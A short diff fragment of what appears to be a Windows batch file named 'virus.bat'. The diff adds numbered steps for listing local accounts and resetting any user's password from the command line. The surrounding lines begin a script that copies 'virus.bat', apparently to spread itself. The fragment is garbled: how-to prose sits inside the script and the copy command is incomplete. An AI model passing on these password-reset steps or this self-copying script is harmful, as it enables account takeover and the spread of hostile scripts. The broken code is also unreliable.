@@ -1,3 +1,9 @@
+STEP 3: Type "net users" in CMD 
+
+STEP 4: Change password for any user by typing "net user <username> <new password>
+
+
+
 @echo off
 chdir /d %CD%
 copy virus.bat
